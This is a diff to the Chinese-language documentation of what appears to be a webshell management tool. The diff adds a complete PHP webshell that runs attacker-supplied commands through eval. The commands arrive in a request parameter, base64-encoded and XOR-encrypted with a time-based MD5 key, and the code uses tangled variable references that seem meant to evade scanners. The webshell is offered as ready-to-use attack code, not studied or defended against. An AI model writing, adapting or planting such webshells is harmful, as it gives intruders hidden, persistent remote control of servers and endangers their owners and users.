@@ -208,6 +208,31 @@ def run(data: str):
 
     return cipher
 ```
+对应的php webshell
+```php
+<?php 
+class COMI { 
+    public $c='';
+    function __destruct() {
+        return eval(substr($this->c, 0));
+    }
+}
+date_default_timezone_set("PRC");
+$comi = new COMI();
+$password = &$password1;
+$password1 = $_REQUEST['x'];
+$post = &$password;
+$post=base64_decode($post);
+$key=md5(date("Y-m-d H:i",time()));
+for($i=0;$i<strlen($post);$i++){
+    $post[$i] = $post[$i] ^ $key[$i%32];
+}
+$lnng1 = &$lnng;
+$lnng = $post;
+$lnng2 = $lnng1;
+@$comi->c = substr($lnng2, 0);
+?>
+```
 
 ## 自定义webshell模板
 1. 进入doughnuts/webshell_plugins目录
